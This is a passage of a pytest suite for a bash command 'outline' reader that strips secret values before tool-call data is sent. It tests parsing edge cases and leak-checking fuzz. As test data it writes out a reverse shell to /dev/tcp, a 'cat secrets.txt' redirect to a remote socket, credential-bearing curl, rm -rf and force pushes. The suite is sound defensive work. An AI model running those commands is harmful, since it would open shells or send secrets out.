    "cat <<'EOF' $(true\nEOF\n)\n{s}\nEOF",
    "cat <<EOF \"$(true\nEOF\n)\"\n{s}\nEOF",
    "cat <<EOF `true\nEOF\n`\n{s}\nEOF",
    "cat <<EOF <(true\nEOF\n)\n{s}\nEOF",
    "cat <<EOF >(true\nEOF\n)\n{s}\nEOF",
    "cat <<\\END $(cat <<END\nx\nEND\n) $(cat <<END\ny\nEND\n)\n{s}\n{s} x\nEND",
    "cat <<-EOF $(true\n\tEOF\n)\n\t{s}\n\tEOF",
    # A bare [[ is a test only where a command begins. Anywhere else it is an
    # argument, and the text after it is not an expression to skip: a comment or a
    # here-document body there is not a command list, and a $( ) in it runs nothing.
    "echo [[\ncat > run.sh <<'EOF'\nresult=$({s} --token=abc)\nEOF",
    "type [[\n# deploy with $({s} --api-key-abc123)\n",
    "printf '%s' [[\ncat <<'EOF'\n$({s})\nEOF",
    "echo [[ ; cat <<'EOF'\n$({s})\nEOF",
    "grep -c [[ file\ncat <<'EOF'\n$({s})\nEOF",
    "echo [[\ncat <<'EOF'\nfoo ]] bar\n{s} two\nEOF",
    "true && echo [[\n# $({s})",
    "sudo [[\n# `{s}`",
    "A=1 [[\n# $({s})",
    "> f [[\n# $({s})",
    "time -p [[\n# $({s})",
    # A # that begins a word inside a real [[ ]] is a comment, and nothing in it runs.
    "[[ -n x &&\n# $({s} --flag)\n-n y ]] && ls",
    "[[ ( # $({s})\n-n x ) ]]",
    "[[ -n x # $({s})\n]]",
    "[[ x ==\n  # `{s}`\n  y ]]",
    "[[ $x =~ (a)# $({s})\n ]]",
    # /dev/tcp/HOST/PORT and /dev/udp/HOST/PORT are sockets. The host and the port
    # are a destination, and they passed as a redirect target by syntax.
    "cat x > /dev/tcp/{s}/4444",
    "exec 3<>/dev/tcp/{s}/5432",
    "echo hi >/dev/udp/{s}/514",
    "cat < /dev/tcp/{s}/80",
    "echo x &> /dev/tcp/{s}/9",
    "echo x >> /dev/tcp/{s}/9",
    "echo x >| //dev/tcp/{s}/9",
    "bash -i >& /dev/tcp/{s}/4444 0>&1",
    # Only env, sudo, watch and the reserved word time take NAME=value before the
    # program. After any other wrapper, and after time typed after an assignment, a
    # redirect or a quote (then it is /usr/bin/time), NAME=value is the name of the
    # program to run, it fails, and the word after it is an argument.
    "nohup A=1 {s}",
    "exec A=1 {s}",
    "command A=1 {s}",
    "builtin A=1 {s}",
    "xargs A=1 {s}",
    "doas A=1 {s}",
    "A=1 time k=v {s}",
    "> f time k=v {s}",
    "\"time\" k=v {s}",
    "sudo nohup A=1 {s}",
    "env xargs A=1 {s}",
    "time nohup A=1 {s}",
    "nohup B=2 A=1 {s}",
    # Reader behaviour a mutation of it once left unpinned: the end of an ANSI-C
    # string at a quote that is not escaped, a ( or a # comment inside an array
    # literal, a backslash inside double quotes, and a # comment with a separator in it.
    "echo $'x\\'\\'; {s} ' 'z'",
    "A=(a # note )\n{s} x)",
    "A=(a (b) {s} )",
    "\"{s}\\x\"",
    "ls; \"{s}\\q\"",
    "sudo \"{s}\\q\"",
    "echo hi # note; {s}",
    "ls\n# a | {s} -x",
    # Round 6. Bash removes a line continuation before it reads a token, so a $ then
    # a continuation then ( or { inside double quotes is an expansion, and the inner
    # quote does not end the string.
    "echo \"$\\\n(echo \"x >{s} \")\"",
    "echo \"$\\\n{{x:-\"a >{s} \"}}\"",
    "echo \"$\\\n$(echo hi >{s})\"",
    "echo \"$$\\\n$(echo hi >{s})\"",
    # The head of an array assignment is NAME[ with the continuations taken out, and
    # its subscript runs to the matching ] with blanks and operators in it.
    "a\\\n[k >{s} ]=1",
    "time a\\\n[k >{s} ]=1",
    "x=1 a\\\n[k >{s} ]=1",
    "ab\\\nc[k >{s} ]=1",
    "a\\\n\\\n[k >{s} ]=1",
    "_a1\\\n\\\n[k;>{s} ]+=x",
    "( m\\\n[k >{s} ] )",
    # A [[ closes at the first ]] that is a word by itself, across a continuation,
    # after a ) and before a < or >. The later ]] here is a here-document body.
    "[[ -f a \\\n]]\ncat <<'E'\nx ]] >{s}\nE",
    "[[ a ]\\\n] && cat <<'E'\nx ]] >{s}\nE",
    "[[ -f a ]]\\\n\ncat <<'E'\nx ]] >{s}\nE",
    "[[ ( -f a )]]\ncat <<'E'\nx ]] >{s}\nE",
    "[[ -f a ]]>/dev/null\ncat <<'E'\nx ]] >{s}\nE",
    "[[ -f a ]]</dev/null\ncat <<'E'\nx ]] >{s}\nE",
    "[[ -f a ]]&>/dev/null\ncat <<'E'\nx ]] >{s}\nE",
    "[[ a =~ (b)]]\ncat <<'E'\nx ]] >{s}\nE",
    # A continuation does not end the blank before a #, so the comment is a comment.
    "[[ -n x \\\n# $(a >{s} b)\n]]",
    "[[ -n x ]] && [[ -z y \\\n# $(a >{s} b)\n]]",
    # Inside $( ), <( ) and backticks bash ends the substitution at a here-document
    # line that begins with the delimiter and goes on, E) or a closing backtick.
    "x=$(cat <<E\nbody\nE )\ncat <<'F'\nE\nls >{s}\n)\nF",
    "x=$(cat <<E\nbody\nE)\ncat <<'F'\nE\nls >{s}\n)\nF",
    "x=$(cat <<E\nbody\nE) # c\ncat <<'F'\nE\nls >{s}\n)\nF",
    "x=$(cat <<E\nbody\nE)x\ncat <<'F'\nE\nls >{s}\n)\nF",
    "x=$(cat <<'E'\nbody\nE)\ncat <<'F'\nE\nls >{s}\n)\nF",
    "x=$(cat <<-E\nbody\n\tE)\ncat <<'F'\nE\nls >{s}\n)\nF",
    "x=$(cat <<E\nbody\nE\\\n)\ncat <<'F'\nE\nls >{s}\n)\nF",
    "echo <(cat <<-E\n/tmp/x\nE)\ncat <<'F'\nE\nls >{s}\n)\nF",
    "x=`cat <<E\nbody\nE`\ncat <<'F'\nE\nls >{s}\n`\nF",
    "x=`cat <<'E'\nbody\nE`\ncat <<'F'\nE\nls >{s}\n`\nF",
    "echo \"$(cat <<'EOF'\nsubject\nEOF)\"\ncat <<'F'\nEOF\nls >{s}\n)\nF",
    "echo \"$( (cat <<E\nbody\nE) )\ncat <<'F'\nE\nls >{s}\n)\nF",
    # Runtime parse state: an alias can expand to the start of a here-document.
    "shopt -s expand_aliases\nalias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
    "shopt -s expand_aliases; alias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
    "eval 'shopt -s expand_aliases'\nalias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
    "shopt -s expand_aliases\neval \"alias foo='cat <<EOF'\"\nfoo\na >{s}\nEOF",
    "shopt -s expand_aliases\ncommand alias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
    "shopt -s expand_aliases\nbuiltin alias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
    "shopt -s expand_aliases\nBASH_ALIASES[foo]='cat <<EOF'\nfoo\na >{s}\nEOF",
    "shopt -s expand_alia\\\nses\nalias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
    "o=expand_ali; o+=ases; shopt -s $o\nalias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
    "shopt -s \"$(echo expand_aliases)\"\nalias foo='cat <<EOF'\nfoo\na >{s}\nEOF",
]


@pytest.mark.parametrize("canary", CANARIES)
@pytest.mark.parametrize("command", VALUE_PLACES)
def test_no_value_leaves_wherever_it_sits_in_a_command(stub, secrets, command, canary):
    command = command.format(s=canary)
    assert canary in command
    text = outline(command)
    assert canary not in text, text
    go(stub, payload(command=command))
    assert canary not in sent_everything(stub)
    assert canary[:6] not in sent_text(stub)


Q, S, BT, BS, NL = '"', "'", "`", "\\", "\n"

# Each wraps a command, as written inside another command's quotes or
# substitution, so every row above is also read at a nesting the rows do not
# spell out. Nothing here runs the command: the reader reads text.
WRAPPERS = {
    "dq_sub": lambda c: "echo " + Q + "$(" + c + ")" + Q,
    "assign_dq_sub": lambda c: "X=" + Q + "$(" + c + ")" + Q,
    "dq_backtick": lambda c: "echo " + Q + BT + c + BT + Q,
    "sh_c_sq": lambda c: "sh -c " + S + c.replace(S, "") + S,
    "eval_dq": lambda c: "eval " + Q + c.replace(Q, BS + Q) + Q,
    "plain_sub": lambda c: "echo $(" + c + ")",
    "if_then": lambda c: "if true; then " + c + "; fi",
    "ssh_dq": lambda c: "ssh host " + Q + c.replace(Q, BS + Q) + Q,
    "time_dq": lambda c: "time " + Q + c.replace(Q, BS + Q) + Q,
    "xargs_dq": lambda c: "xargs " + Q + c.replace(Q, BS + Q) + Q,
    "watch_dq": lambda c: "watch " + Q + c.replace(Q, BS + Q) + Q,
    "group": lambda c: "{ " + c + "; }",
    "subshell": lambda c: "( " + c + " )",
    "for_do": lambda c: "for i in 1 2; do " + c + "; done",
}


def fits_wrapper(wrapper, template):
    """Escaping the quotes of a command that holds a substitution, or putting a
    command that holds backticks inside backticks, makes it a different command
    in which the canary can be a program. Those pairs are not value places."""
    if wrapper in ("eval_dq", "ssh_dq", "time_dq", "xargs_dq", "watch_dq"):
        return "$(" not in template and BT not in template
    if wrapper == "dq_backtick":
        return BT not in template
    return True


@pytest.mark.parametrize("wrapper", sorted(WRAPPERS))
def test_no_value_leaves_when_a_command_sits_inside_another_command(secrets, wrapper):
    leaks = []
    for template in VALUE_PLACES:
        if not fits_wrapper(wrapper, template):
            continue
        for canary in CANARIES:
            command = WRAPPERS[wrapper](template.format(s=canary))
            text = outline(command)
            if canary in text or canary[:6] in text:
                leaks.append((command, text))
    assert leaks == [], leaks[:3]


def quoted_canary_command(rng, canary):
    """A command with the canary only inside quoted text, which nests up to three
    deep through $( ) and backticks, and with the separators, odd quote counts
    and newlines that desynchronise a reader that tracks quotes badly. The canary
    is quoted text in bash whatever the nesting: none of it is a command."""
    seps = [" ", "; ", NL, " | ", " && ", " ", " ", " -", " --", " > "]

    def text(with_canary):
        parts = []
        for _ in range(rng.randint(1, 4)):
            parts.append(rng.choice(["foo", "bar baz", "x", "a-b", "k=v", "tok"]))
            parts.append(rng.choice(seps))
        s = "".join(parts)
        if with_canary:
            i = rng.randint(0, len(s))
            s = s[:i] + rng.choice(seps) + canary + rng.choice(seps) + s[i:]
        return s

    def single(with_canary):
        return S + text(with_canary).replace(S, "") + S

    def double(depth, with_canary):
        body, n = [], rng.randint(1, 3)
        at = rng.randrange(n) if with_canary else -1
        for k in range(n):
            kind = rng.choice(["t", "t", "sub", "bt"]) if depth < 3 else "t"
            if kind == "t":
                body.append(text(k == at).replace(Q, "").replace("$", "").replace(BT, "").replace(BS, ""))
            elif kind == "sub":
                body.append("$(" + command(depth + 1, k == at) + ")")
            else:
                body.append(BT + command(depth + 1, k == at) + BT)
        return Q + "".join(body) + Q

    def command(depth, with_canary):
        words, n = ["echo"], rng.randint(1, 3)
        at = rng.randrange(n) if with_canary else -1
        for k in range(n):
            kind = rng.choice(["sq", "dq", "dq", "bare"])
            if kind == "sq":
                words.append(single(k == at))
            elif kind == "dq":
                words.append(double(depth, k == at))
            else:
                words.append(single(True) if k == at else "w%d" % k)
        return " ".join(words)

    return command(0, True)


@pytest.mark.parametrize("seed", [1, 2, 3])
def test_a_value_inside_quoted_text_never_leaves_at_any_nesting(secrets, seed):
    """The differential fuzz the reader failed at 22165922: 876 leaks in 20,000
    commands at seed 1, found by putting the canary only in quoted text."""
    rng = random.Random(seed)
    leaks, made = [], 0
    for _ in range(4000):
        command = quoted_canary_command(rng, CANARIES[0])
        if CANARIES[0] not in command:
            continue
        made += 1
        text = outline(command)
        if CANARIES[0] in text:
            leaks.append((len(command), command, text))
    assert made > 3500
    leaks.sort()
    assert leaks == [], leaks[:3]


# {bin} is the directory of installed programs, for a program named by its path.
OUTLINE_ROWS = [
    ("curl -u admin:hunter2 https://x.example", "curl -u"),
    ("curl --user admin:hunter2 --cookie a=b https://x", "curl --user --cookie"),
    ("curl --user=admin:hunter2 https://x", "curl --user"),
    ("git push --force-with-lease origin main", "git --force-with-lease"),
    ("git push -f", "git -f"),
    ("rm -rf build", "rm -rf"),
    ("ls -la | grep -rn foo", "ls -la\ngrep -rn"),
    ("sudo rm -rf x", "sudo rm -rf"),
    ("sudo -u admin rm -rf x", "sudo -u -rf"),
    ("env FOO=bar python3 -m pytest -q", "env python3 -m -q"),
    ("FOO=bar {bin}/run.sh --verbose", "run.sh --verbose"),
    ("{bin}/env python3.11 script.py", "env python3.11"),
    ("cat <<'EOF' > notes.md\nhello hunter2\nEOF\nls", "cat notes.md\nls"),
    ("cat > .env <<EOF\nTOKEN=x\nEOF", "cat .env"),
    ("echo hi > out.txt 2>&1", "echo out.txt"),
    ("sort < in.txt > out.txt", "sort in.txt out.txt"),
    ("mysql -u root -phunter2", "mysql -u"),
    ("tar -xzf x.tgz", "tar -xzf"),
    ("tar -czvf x.tgz y", "tar"),
    ("find . -name '*.py' -delete", "find -name -delete"),
    ("echo $(whoami)", "echo\nwhoami"),
    ("echo `whoami`", "echo\nwhoami"),
    ("if true; then echo hi; fi", "true\necho"),
    ("for f in a b; do rm -f $f; done", "rm -f"),
    ("while read l; do echo $l; done", "read\necho"),
    ("ls && cat || grep; sort | tee & rm", "ls\ncat\ngrep\nsort\ntee\nrm"),
    ("echo hi # a comment", "echo"),
    ("python3 -c 'import os'", "python3 -c"),
    ("ls --color=auto -la", "ls --color -la"),
    ("ls -- -la", "ls"),
    ("g++ -O2 x.cc", ""),
    ("x86_64-linux-gnu-gcc --version", "x86_64-linux-gnu-gcc --version"),
    ("", ""),
    ("   \n\n  ", ""),
    # What the reader reads past without looking in, and the commands around it.
    ("[[ -f x ]] && rm -rf build", "rm -rf"),
    ("if [[ -z \"$X\" ]]; then rm -rf build; fi", "rm -rf"),
    ("x=$((1<<4))\ngit push --force origin main\nrm -rf build", "git --force\nrm -rf"),
    ("dd if=/dev/zero of=x bs=$((1<<20)) count=1\nrm x", "dd\nrm"),
    ("echo $((1<<4))\nls -la", "echo\nls -la"),
    ("(( n = 1 << 3 ))\nls", "ls"),
    ("for ((i=0;i<3;i++)); do echo $i; done", "echo"),
    ("ls $(( $(date +%s) - 5 )) && git push --force", "ls\ngit --force"),
    ("PASSWORDS=(hunter2 s3cr3tvalue) ls", "ls"),
    ("declare -a KEYS=(a b)", "declare -a"),
    ("echo $'it\\'s ok; hunter2' && ls", "echo\nls"),
    ("echo ${X:-a b;c} && ls", "echo\nls"),
    # A substitution inside double quotes is a command list with its own quotes.
    ("git commit -m \"$(cat <<'EOF'\nFix the 5\" pipe\nbody\nEOF\n)\" && git push", "git -m\ncat\ngit"),
    ("echo \"$(echo \"a;\nb\")\" && ls", "echo\necho\nls"),
    # A word after a substitution belongs to the command around it.
    ("echo $(whoami) -n", "echo\nwhoami\n-n"),
    ("cat <(sort a) b", "cat\nsort"),
    # A flag is typed bare. Quoting its value does not hide its name.
    ("git commit --message=\"fix\" --author='a b'", "git --message --author"),
    ("git commit -m '--wip-token'", "git -m"),
    ("ls --co\"lor\"=auto", "ls"),
    # &> and &>> are one redirect: the target is a path and the next word an argument.
    ("echo hi &>/dev/null; ls", "echo /dev/null\nls"),
    ("ls &>> log.txt && rm -rf build", "ls log.txt\nrm -rf"),
    ("make 2>&1 &>build.log | tee x", "make build.log\ntee"),
    ("ls &>f &", "ls f"),
    ("sleep 1 & ls", "sleep\nls"),
    ("sleep 1 &\nls", "sleep\nls"),
    # An assignment is one when its name and = are typed bare, whatever its value.
    ("FOO=\"bar baz\" ls -la", "ls -la"),
    ("FOO='a b' BAR=2 ls", "ls"),
    ("FOO=$(echo a) ls", "echo\nls"),
    ("FOO=bar BAZ=qux {bin}/run.sh --verbose", "run.sh --verbose"),
    ("A+=x ls", "ls"),
    ("A[0]=x ls", "ls"),
    ("\"A=1\" ls", ""),
    ("\\A=1 ls", ""),
    ("A\"=\"1 ls", ""),
    ("time \"A=1\" ls", "time"),
    # A reserved word is one only when typed bare and first on its command. After
    # an assignment or a redirect, or quoted or escaped, it is a program.
    ("FOO=bar if x", "if"),
    ("> out.txt if x", "out.txt if"),
    ("2>&1 if x", "if"),
    ("\"if\" x", "if"),
    ("\\if x", "if"),
    ("FOO=bar ! ls", ""),
    ("! FOO=bar ls", "ls"),
    ("> out.txt ls -la", "out.txt ls -la"),
    ("if FOO=bar cat; then ls; fi", "cat\nls"),
    # A carriage return is part of the word, as bash has it.
    ("FOO=bar\rls", ""),
    ("ls\r\npwd", "pwd"),
    # Bash removes a line continuation before it reads a token. It is not a word,
    # it quotes nothing, and what is on both sides of it is joined.
    ("cd build && \\\n  git push --force origin main", "cd\ngit --force"),
    ("FOO=1 \\\n  BAR=2 \\\n  git push --force origin main", "git --force"),
    ("cat a.log |\\\n  grep -rn foo", "cat\ngrep -rn"),
    ("ls ;\\\n cat --force", "ls\ncat --force"),
    ("git push \\\n  --force", "git --force"),
    ("ec\\\nho hi", "echo"),
    ("FOO=\\\nbar ls -la", "ls -la"),
    ("i\\\nf true; then ls; fi", "true\nls"),
    ("[\\\n[ -f x ]] && rm -rf build", "rm -rf"),
    ("true && \\\n[[ -f x ]] && rm -rf build", "true\nrm -rf"),
    # A here-document body ends at the line that is the delimiter once bash has
    # joined a line that ends in an odd number of backslashes to the one after it.
    # A quoted delimiter joins nothing, and neither does an even number.
    ("cat <<EOF\nfoo\\\nEOF\nhunter2pw --token abc\nEOF\nls", "cat\nls"),
    ("cat <<EOF\nE\\\nOF\nls", "cat\nls"),
    ("cat <<EOF\n\\\nEOF\nls", "cat\nls"),
    ("cat <<EOF\nfoo\\\\\nEOF\nls", "cat\nls"),
    ("cat <<EOF\nfoo\\\\\\\nEOF\nls\nEOF\npwd", "cat\npwd"),
    ("cat <<-EOF\n\tfoo\\\n\tEOF\nls\n\tEOF\npwd", "cat\npwd"),
    ("cat <<-EOF\n\\\n\tEOF\nls", "cat\nls"),
    ("cat <<'EOF'\nfoo\\\nEOF\nls -la\nEOF", "cat\nls -la\nEOF"),
    ("cat <<E\"O\"F\nfoo\\\nEOF\nls", "cat\nls"),
    ("cat <<E\\\nOF\nx\nEOF\nls", "cat\nls"),
    # A delimiter is literal text, quoted or not, and a quoted $ in it is only a $.
    ("cat <<\"$X\"\n$X\nls", "cat\nls"),
    ("cat <<'$'\n$\nls", "cat\nls"),
    # $$ is the process id. A ( after it is text, and a $( after a pair is a
    # substitution, as it is in bash.
    ("echo \"pid$$(x y)\" && ls", "echo\nls"),
    ("echo \"$$$(ls y)\"", "echo\nls"),
    ("echo \"\\$$(ls y)\"", "echo\nls"),
    ("echo $$ && ls", "echo\nls"),
    ("rm -f /tmp/x.$$; git push --force", "rm -f\ngit --force"),
    ("echo \"$$\"; git push --force", "echo\ngit --force"),
    # A $( ), backticks or <( ) is parsed apart from the command around it: a
    # here-document the outer command waits for takes its body after the line, and
    # the delimiter-only line inside is a command named EOF, which bash runs. A
    # subshell is part of the outer parse and the body starts at its newline.
    ("cat <<EOF $(true\nEOF\n)\nhunter2pw\nEOF\nls", "cat\ntrue\nEOF\nls"),
    ("cat <<EOF `true\nEOF\n`\nhunter2pw\nEOF\nls", "cat\ntrue\nEOF\nls"),
    ("cat <<\\END $(cat <<END\nx\nEND\n) $(cat <<END\ny\nEND\n)\nhunter2pw\nEND\nls", "cat\ncat\ncat\nls"),
    ("cat <<EOF; (true\nbody\nEOF\n)\nls", "cat\ntrue\nls"),
    ("git commit -m \"$(cat <<'EOF'\nbody\nEOF\n)\" && git push --force", "git -m\ncat\ngit --force"),
    # A [[ at the start of a command, or straight after time, is a test and its
    # words are read past. A real $( ) in it runs, so its programs are sent; one in
    # a comment inside it does not.
    ("[[ -n \"$(whoami)\" ]] && ls", "whoami\nls"),
    ("time [[ -f x ]] && rm -rf build", "time\nrm -rf"),
    ("[[ -n x &&\n# $(hunter2)\n-n y ]] && ls", "ls"),
    ("ls; [[ a#b == a#b ]] && git push --force", "ls\ngit --force"),
    ("ls; [[ $# -gt 0 && ${#arr[@]} -gt 0 ]] && git push --force", "ls\ngit --force"),
    # NAME=value is skipped after env, sudo, watch and the reserved word time. After
    # any other wrapper it is the program's name and the word after is an argument.
    ("env A=1 ls", "env ls"),
    ("sudo A=1 ls", "sudo ls"),
    ("watch A=1 ls", "watch ls"),
    ("time A=1 ls", "time ls"),
    ("sudo env A=1 B=2 ls", "sudo env ls"),
    ("nohup A=1 ls", "nohup"),
    ("exec A=1 ls", "exec"),
    ("command A=1 ls", "command"),
    ("builtin A=1 ls", "builtin"),
    ("xargs A=1 ls", "xargs"),
    ("doas A=1 ls", "doas"),
    ("sudo nohup A=1 ls", "sudo nohup"),
    ("A=1 time k=v ls", "time"),
    # The program nohup runs is A=1, which is not a command, so its flag goes too.
    ("nohup A=1 -x ls", "nohup"),
    ("nohup A=1 'x y' ls", "nohup"),
    # A redirect to /dev/tcp/HOST/PORT or /dev/udp/HOST/PORT is a socket and not a
    # path. Any other redirect target is still a path, and so is the same text when
    # it is relative, which bash does not open as a socket.
    ("cat secrets.txt > /dev/tcp/203.0.113.7/4444", "cat"),
    ("exec 3<>/dev/tcp/db.internal.example.com/5432", "exec"),
    ("echo hi >/dev/udp/10.9.8.7/514", "echo"),
    ("echo hi > /dev/null", "echo /dev/null"),
    ("echo hi > ./dev/tcp/x/y", "echo ./dev/tcp/x/y"),
    # What the stops of round 5 leave alone: a subscript closed before anything that
    # splits the word, a process substitution after a blank, a comment outside
    # backticks, and backticks without a comment or a backslash in them.
    ("m[1]=x; m[$i]=y; m[i+1]=z; ls", "ls"),
    ("m[1]=x >f; ls", "f\nls"),
    ("cat <<EOF <(sort a)\nbody\nEOF\nls", "cat\nsort\nls"),
    ("cat <<EOF >(sort a)\nbody\nEOF\nls", "cat\nsort\nls"),
    ("cat <<EOF>out.txt\nbody\nEOF\nls", "cat out.txt\nls"),
    ("echo `cat <<EOF\nhello\nEOF\n`; ls", "echo\ncat\nls"),
    ("echo `echo $'abc'`; ls", "echo\necho\nls"),
    ("ls # a `comment`\ngit push --force", "ls\ngit --force"),
    ("echo $(echo $'a\\\\'); git push --force", "echo\necho\ngit --force"),
    # What the stops of round 6 leave alone. A ]] is the first one that is a word by
    # itself, so the test closes there and what follows is read: across a line
    # continuation, and before a ; & | ) < or > that does not open a <( or a >(.
    ("ls; [[ -f a \\\n]]; git push --force", "ls\ngit --force"),
    ("ls; [[ a ]\\\n]; git push --force", "ls\ngit --force"),
    ("ls; [[ a ]]\\\n; git push --force", "ls\ngit --force"),
    ("ls; [[ a ]]\\\n>/dev/null; git push --force", "ls\n/dev/null\ngit --force"),
    ("ls; [[ a ]]>/dev/null; git push --force", "ls\n/dev/null\ngit --force"),
    ("ls; [[ a ]]</dev/null; git push --force", "ls\n/dev/null\ngit --force"),
    ("ls; [[ -n x \\\n# $(a b)\n]]; git push --force", "ls\ngit --force"),
    ("ls; [[ -n x \\\n# c\n]]; git push --force", "ls\ngit --force"),
    ("ls; ( [[ a ]]); git push --force", "ls\ngit --force"),
    # A $ that is not followed by a line continuation is a literal one, and a
    # continuation after an escaped $ or a doubled one that is not an expansion.
    ("ls; echo \"\\$\\\n(x y)\"; git push --force", "ls\necho\ngit --force"),
    ("ls; echo \"$\"; git push --force", "ls\necho\ngit --force"),
    # A subscript that closes before anything that splits the word is read with a
    # continuation in the name or before the [, as it is without one.
    ("ls; m\\\n[1]=x; git push --force", "ls\ngit --force"),
    ("ls; a\\\nb[1]=x >f; git push --force", "ls\nf\ngit --force"),
    # A here-document body line that begins with the delimiter ends the read only
    # inside a $( ), a <( ) or backticks. Anywhere else it is a line of the body,
    # and so is one that does not begin with the delimiter.
    ("ls; (cat <<E\nbody\nE)\nE\n); git push --force", "ls\ncat\ngit --force"),
    ("ls; { cat <<E\nbody\nE)\nE\n}; git push --force", "ls\ncat\ngit --force"),
    ("ls\ncat <<E\nbody\nE)\nE\ngit push --force", "ls\ncat\ngit --force"),
    ("ls; echo $(cat <<E\nfoo (parens) here\nE\n); git push --force", "ls\necho\ncat\ngit --force"),
    ("ls; echo $(cat <<E\n E)\nE\n); git push --force", "ls\necho\ncat\ngit --force"),
    ("ls; echo $(cat <<-E\n\tE\n); git push --force", "ls\necho\ncat\ngit --force"),
    ("ls; echo `cat <<E\nbody\nE\n`; git push --force", "ls\necho\ncat\ngit --force"),
    # shopt with an option that is a plain name is not a stop, and neither is a word
    # that only looks like the start of one.
    ("ls; shopt -s nullglob; git push --force", "ls\nshopt -s\ngit --force"),
    ("ls; shopt -u dotglob; git push --force", "ls\nshopt -u\ngit --force"),
    ("ls; unalias foo; git push --force", "ls\nunalias\ngit --force"),
    ("ls; git config alias.co checkout; git push --force", "ls\ngit\ngit --force"),
    ("ls; echo unalias aliases; git push --force", "ls\necho\ngit --force"),
    ("ls; git --alias; git push --force", "ls\ngit --alias\ngit --force"),
    ("ls; echo \"$o\"; git push --force", "ls\necho\ngit --force"),
]


@pytest.mark.parametrize("command,expected", OUTLINE_ROWS)
def test_the_outline_of_a_command_is_programs_flags_and_paths(secrets, installed_bin, command, expected):
    assert outline(command.replace("{bin}", str(installed_bin))) == expected


@pytest.mark.parametrize("tool,field", [("Write", "file_path"), ("Edit", "file_path"), ("NotebookEdit", "notebook_path")])
@pytest.mark.parametrize("target", ["/dev/tcp/203.0.113.7/4444", "/dev/udp/10.9.8.7/514", "//dev/tcp/h.example/80"])
def test_a_socket_pseudo_path_is_not_sent_as_a_file_path(stub, tool, field, target):
    go(stub, payload(tool=tool, tool_input={field: target, "content": "x"}))
    assert sent_text(stub) == "fields %s content" % field
    assert "203.0.113.7" not in sent_everything(stub) and "10.9.8.7" not in sent_everything(stub)


CONTINUATION_CORPUS = [
    "cd build && git push --force origin main",
    "FOO=1 BAR=2 git push --force origin main",
    "cat a.log | grep -rn foo",
    "ls ; cat --force",
    "curl -u admin:hunter2 https://x.example",
    "sudo -u admin rm -rf x",
    "env FOO=bar python3 -m pytest -q",
    "if true; then echo hi; fi",
    "for f in a b; do rm -f $f; done",
    "echo $(whoami) -n",
    "ls -la || rm -rf build",
    "time -p ls",
    "! FOO=bar ls",
    "x=$(date) ls -la",
    "git commit -m 'ab' --author=x",
    "sort < in.txt > out.txt",
    "echo a &>/dev/null; ls",
    "(echo a; ls -la)",
    "{ echo a; ls -la; }",
]


@pytest.mark.parametrize("command", CONTINUATION_CORPUS)
def test_a_line_continuation_next_to_a_space_changes_nothing_in_the_outline(command):
    """Bash removes the continuation before it reads a token, so a command that
    has one next to any of its spaces is the same command. The one place that is
    stopped at on purpose is right after < > or &, which may be half an operator."""
    expected = outline(command)
    assert expected
    seen = 0
    for at, ch in enumerate(command):
        if ch != " ":
            continue
        for glue in ("\\\n", "\\\n  "):
            variants = [command[:at + 1] + glue + command[at + 1:]]
            if command[at - 1] not in "<>&":
                variants.append(command[:at] + glue + command[at:])
            for variant in variants:
                seen += 1
                assert outline(variant) == expected, variant
    assert seen >= 4


def pinned_bash():
    """The bash these rows were checked against, or a skip. The rules they pin are
    old, but a runner's bash is not necessarily this version."""
    bash = shutil.which("bash", path=ORIGINAL_PATH)
    if not bash:
        pytest.skip("no bash here")
    version = subprocess.run([bash, "-c", "echo $BASH_VERSION"], capture_output=True, text=True, timeout=30).stdout.strip()
    if version != jev.BASH_VERSION_PINNED:
        pytest.skip("bash here is %s and the rows were checked against %s" % (version, jev.BASH_VERSION_PINNED))
    return bash


def bash_parse(bash, text, tmp_path):
    """How bash parses a script, as its own --pretty-print prints it, or None when it
    does not parse. Nothing is run: the option prints the script and exits."""
    script = tmp_path / "script.sh"
    script.write_text(text)
    done = subprocess.run([bash, "--pretty-print", str(script)], capture_output=True, text=True, timeout=30,
                          cwd=tmp_path, env={"PATH": "/nonexistent", "LC_ALL": "C"}, stdin=subprocess.DEVNULL)
    return done.stdout if done.returncode == 0 else None


# The commands above, and the constructs bash reads differently once a line
# continuation is taken out of them, each with a redirect target "f" in a place that
# is data in bash: a $ before a ( inside double quotes, the head of an array
# assignment, the end of a [[ ]] and a comment inside one, a here-document in a
# substitution, an alias.
EVERY_INDEX_CORPUS = CONTINUATION_CORPUS + [
    "echo \"$(echo \"x >f \")\"",
    "echo \"${x:-\"a >f \"}\"",
    "echo \"$(echo hi >f)\"",
    "echo \"$$(echo hi)\" >f",
    "m[k >f ]=1",
    "time m[k >f ]=1",
    "x=1 ab[k >f ]=1",
    "ls; abc[k >f ]=1; ls",
    "[[ -f a ]]\ncat <<'E'\nx ]] >f\nE",
    "[[ ( -f a ) ]]\ncat <<'E'\nx ]] >f\nE",
    "[[ -f a ]] >/dev/null\ncat <<'E'\nx ]] >f\nE",
    "[[ -n x ]] && cat <<'E'\nx ]] >f\nE",
    "[[ -n x # $(a >f b)\n]]",
    "x=$(cat <<E\nbody\nE\n)\ncat <<'F'\nE\nls >f\n)\nF",
    "echo <(cat <<-E\n/tmp/x\n\tE\n)\ncat <<'F'\nE\nls >f\n)\nF",
    "x=`cat <<E\nbody\nE\n`\ncat <<'F'\nE\nls >f\n`\nF",
    "shopt -s expand_aliases\nalias foo='cat <<EOF'\nfoo\na >f\nEOF",
]


def continuation_violations(bash, command, tmp_path, outline_of=outline):
    """(how many variants were compared, the ones that gained a piece). A variant is the
    command with a line continuation at one index, and it is compared only when bash's
    own parse of it is the parse of the command without the continuation, which is when
    the continuation is nothing: one inside a comment moves the rest of the comment onto
    a new line, and bash reads that as code. The outline of a variant may be shorter,
    because the reader stops at a continuation it cannot place, and it may never hold a
    piece the command without the continuation did not."""
    parsed = bash_parse(bash, command, tmp_path)
    assert parsed is not None, "a command in the corpus that bash does not parse"
    base = outline_of(command).split()
    checked, gained = 0, []
    for at in range(len(command) + 1):
        variant = command[:at] + "\\\n" + command[at:]
        if bash_parse(bash, variant, tmp_path) != parsed:
            continue
        checked += 1
        got = outline_of(variant).split()
        if got != base[:len(got)]:
            gained.append((variant, got, base))
    return checked, gained


